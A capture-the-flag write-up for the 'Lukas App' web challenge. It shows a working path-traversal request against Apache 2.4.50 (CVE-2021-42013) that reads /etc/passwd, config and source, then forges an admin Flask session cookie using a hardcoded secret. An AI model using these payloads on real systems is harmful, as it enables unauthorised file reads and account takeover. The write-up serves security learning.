# Lukas App

## Description

> After the excellent success of the luca-app we now decided to build our own tracing apps. We still have some technical difficulties but you may still want to have a look: https://lukas-app.de. At least we managed to get the TLS certificates for all hosts!
>
> Hint 1: Read the challenge description carefully. There already is a big hint in it.
>
> Hint 2: There is only a tiny bit of guesswork involved, and it's not hard to find. A lot of teams already found it. Also again: Automated tooling like dirbuster or sqlmap will not help you with this challenge.
>
> Hint 3: We at Lukas App are proud to be running our software in the cloud. We don't even need to care about server updates or weird protocol headers anymore.

## Solution

The contents of https://lukas-app.de are not very interesting. It's only a static site, with a non-working captcha. The web challenges in this CTF don't involve any scanning and brute-forcing, so there's nothing else for us here.

![](<../../.gitbook/assets/Screenshot 2021-11-29 at 11.51.36 AM.png>)

### Certificate Search

The description said "At least we managed to get the TLS certificates for all hosts!", and the hints point us in that direction, so I decided to do a `crt.sh` certificate search.

![](<../../.gitbook/assets/image (81) (1) (1).png>)

This indeed revealed two additional subdomains! `beta.lukas-app.de` is another web app. There's a login page, but not much else.

![](<../../.gitbook/assets/Screenshot 2021-11-29 at 11.57.41 AM.png>)

I noticed that the logo here is fetched from `https://cdn.lukas-app.de/static/logo.png`. But when visiting this URL, we are actually redirected to another domain: `https://cdn-eu-west.lukas-app.de/static/logo.png`.

### Path Traversal

Looking at the response headers, I immediately noticed that we have hit the jackpot - this server, unlike the others, returned `Server: Apache/2.4.50 (Unix)`, which was vulnerable to a recent path traversal vulnerability (CVE-2021-42013)!

{% embed url="https://www.exploit-db.com/exploits/50406" %}

Using the usual payload (`.%%32%65`), however, gave us a 400 Bad Request. I think this was due to the server using both Nginx (which would have already performed one round of URL decoding) and Apache (which would then receive the URL-decoded path). To overcome this, I had to URL-encode the PoC payload again (a _triple_ URL encoding by now!)

Now we get a different error (403 Forbidden) using `GET /cgi-bin/.../etc/passwd`.

I was stuck here for a while, until I came across some inspiration from [Twitter](https://twitter.com/\_\_mn1\_\_/status/1445655933242134530): instead of `/cgi-bin/` maybe the `/static/` path, where the logo is stored, is an `Alias` to some directory?

![](<../../.gitbook/assets/Screenshot 2021-11-29 at 12.09.16 PM.png>)

I finally got a working path traversal: `GET /static/%25%2532%2565%25%2532%2565%2F%25%2532%2565%25%2532%2565%2Fetc/passwd HTTP/2`

I then read the Apache configuration file (at `/usr/local/apache2/conf/httpd.conf`), which confirmed my hypothesis. Interestingly, the `/static/` URL maps to `/app/static`. Could this be the same directory where the web app is stored?

```
...

Alias "/static" "/app/static"

...
```

Indeed, I was able to read the source code from `/app/app.py`.

```python
#!/usr/bin/env python3

from flask import Flask, session, redirect, url_for, escape, request, render_template
import werkzeug.exceptions
import crypt
import secrets

app = Flask(__name__)
app.secret_key = "secrets.token_bytes(50)"

FLAG = open("/flag.txt").read()

@app.route("/")
def index():
    if "username" not in session:
        return redirect("/login?msg=Login+required")

    if session["username"] == "root":
        return "Hello, %s!<br/>\nHave a nice flag: %s" % (session["username"], FLAG)
    else:
        return "Hello, %s!<br/>\nNo flags available for you."

@app.route("/robots.txt")
def robotstxt():
    return open("robots.txt").read()

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.tpl", msg=request.args.get("msg", ""))

    username = request.form["username"]
    password = request.form["password"]

    # use system logins during beta phase, needs to be moved to database for production use!
    users = dict(x.split(":")[:2] for x in open("/etc/shadow").readlines() if x.split(":")[1][0] != "!")
    if username not in users:
        return redirect("/login?msg=Invalid+credentials")
    if crypt.crypt(password, users[username]) != users[username]:
        return redirect("/login?msg=Invalid+credentials")

    session["username"] = username
    return redirect("/")

@app.errorhandler(werkzeug.exceptions.BadRequest)
def handle_bad_request(e):
    return "/app/app.py:app raised an exception:<br/>" + str(e), 400

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
```

### Baking Cookies

The final nail in the coffin came from the following programming error in the secret key (it's a string):

```python
app.secret_key = "secrets.token_bytes(50)"
```

We simply need to change our session `username` to `root`, in order to get the flag.

```python
@app.route("/")
def index():
    if "username" not in session:
        return redirect("/login?msg=Login+required")

    if session["username"] == "root":
        return "Hello, %s!<br/>\nHave a nice flag: %s" % (session["username"], FLAG)
    else:
        return "Hello, %s!<br/>\nNo flags available for you."
```

Since the server uses client-side cookies, we can simply sign the Flask cookie with our desired username.

```
$ flask-unsign --sign --cookie "{'username': 'root'}" --secret "secrets.token_bytes(50)"
eyJ1c2VybmFtZSI6InJvb3QifQ.YaORNg.qF6ApxeBVfgNfKnMi5j6FegPqSM
```

Change the session cookie and get the flag!

```
Hello, root!
Have a nice flag: CSR{%79%6f%75%20%63%61%6e%27%74%20%65%73%63%61%70%65%20%74%68%65%20%64%6f%75%62%6c%65%20%64%6f%74%73}
```
